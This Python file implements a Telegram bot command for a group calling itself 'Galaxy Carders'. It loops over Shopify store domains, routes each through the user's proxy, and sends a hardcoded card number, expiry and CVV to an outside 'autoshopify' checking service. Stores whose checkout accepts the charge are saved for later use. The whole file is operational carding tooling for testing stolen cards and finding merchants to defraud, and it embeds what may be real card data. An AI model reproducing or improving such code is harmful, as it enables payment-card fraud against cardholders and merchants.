import json
import requests
import time
import re

# Test CC
demo_cc = "5178955103156360|04|2030|524"

# Bad responses to skip
BAD_RESPONSES = [
    "del ammount empty", "INVALID URL", "HANDLE IS EMPTY",
    "RECEIPT ID IS EMPTY", "HCAPTCHA DETECTED", "AMOUNT_TOO_SMALL"
]

# Markdown escape
def escape(text):
    return re.sub(r'([_*\[\]()~`>#+=|{}.!\\-])', r'\\\1', str(text))

# Parse and return formatted proxy string
def get_proxy(user_id):
    try:
        with open("proxies.json", "r") as f:
            proxies = json.load(f)
        raw = proxies.get(str(user_id))
        if raw:
            parts = raw.split(":")
            if len(parts) == 5:
                host, port, user, pwd = parts[0], parts[1], parts[3], parts[4]
            elif len(parts) == 4:
                host, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
            else:
                return None
            return f"http://{user}:{pwd}@{host}:{port}"
    except:
        return None

# Check proxy validity
def check_proxy(proxy):
    try:
        proxies = {"http": proxy, "https": proxy}
        start = time.time()
        res = requests.get("http://ip-api.com/json", proxies=proxies, timeout=7)
        latency = round((time.time() - start) * 1000)
        if res.status_code == 200 and "query" in res.json():
            ip = res.json()["query"]
            return True, f"🟢 LIVE ({ip}) — {latency}ms"
    except:
        pass
    return False, "🔴 DEAD"

# Save live site for user
def save_site(site, user_id):
    try:
        with open("sites.json", "r") as f:
            data = json.load(f)
        if not isinstance(data, dict):
            data = {}
    except:
        data = {}

    uid = str(user_id)
    if uid not in data:
        data[uid] = []

    if site not in data[uid]:
        data[uid].append(site)
        with open("sites.json", "w") as f:
            json.dump(data, f, indent=4)

# Main MURL command
def register_handlers(bot):
    @bot.message_handler(commands=["murl"])
    def handle_murl(message):
        user_id = message.from_user.id
        username = message.from_user.username or "unknown"
        args = message.text.split()[1:]

        if not args:
            return bot.reply_to(message, "⚠️ Usage:\n`/murl site1.com site2.com`", parse_mode="Markdown")

        # Load and check proxy
        proxy = get_proxy(user_id)
        if not proxy:
            return bot.reply_to(message, "❌ No proxy found.\nUse /addproxy to set.", parse_mode="Markdown")

        is_valid, proxy_status = check_proxy(proxy)
        if not is_valid:
            return bot.reply_to(message,
                f"❌ *Your proxy is dead or invalid.*\n➕ Use `/addproxy` to change it.\n_No sites were checked._",
                parse_mode="Markdown")

        reply = bot.reply_to(message, "🔍 Checking sites...\nPlease wait...", parse_mode="Markdown")

        header = (
    "╔════════════════════╗\n"
    " ✦✧   𝓢𝓱𝓸𝓹𝓲𝓯𝔂 • 𝓢𝓲𝓽𝓮𝓼 • 𝓐𝓭𝓭𝓮𝓭   ✧✦\n"
    "╠════════════════════╣\n"
)
        content = ""
        start_time = time.time()

        for site in args:
            try:
                url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={demo_cc}&proxy={proxy}"
                res = requests.get(url, timeout=25)
                result = res.json()
            except:
                result = {
                    "Response": "Error or Timeout",
                    "Status": "false",
                    "Price": "-",
                    "Gateway": "-",
                    "cc": demo_cc
                }

            response = result.get("Response", "No Response")
            status = result.get("Status", "false")
            price = result.get("Price", "-")
            gateway = result.get("Gateway", "-")

            if any(bad.lower() in response.lower() for bad in BAD_RESPONSES):
                continue

            if status.lower() == "true":
                save_site(site, user_id)

            content += (
                f"`🛒 Site:` `{escape(site)}`\n"
                f"`📬 Response:` `{escape(response)}`\n"
                f"`📊 Status:` *_{escape(status.upper())}_*\n"
                f"`💰 Price:` `${escape(price)}`\n"
                f"`💳 Gateway:` *{escape(gateway)}*\n"
                f"`🌐 Proxy:` `{escape(proxy_status)}`\n"
                f"━━━━━━━━━━━━━━━\n"
            )

            try:
                bot.edit_message_text(header + content, message.chat.id, reply.message_id, parse_mode="MarkdownV2")
            except:
                pass

            time.sleep(1)

        elapsed = round(time.time() - start_time, 2)

        footer = (
            f"[Galaxy Carders](https://t.me/galaxy_Carders)\n"
            f"*👤 Checked by:* [@{escape(username)}](https://t.me/{escape(username)})\n"
            f"`⏱ Time-lapse:` `{elapsed} seconds`\n"
            f"╚════════════════════╝"
        )

        final_output = header + content + footer

        try:
            bot.edit_message_text(final_output, message.chat.id, reply.message_id, parse_mode="MarkdownV2")
        except:
            bot.send_message(message.chat.id, final_output, parse_mode="MarkdownV2")
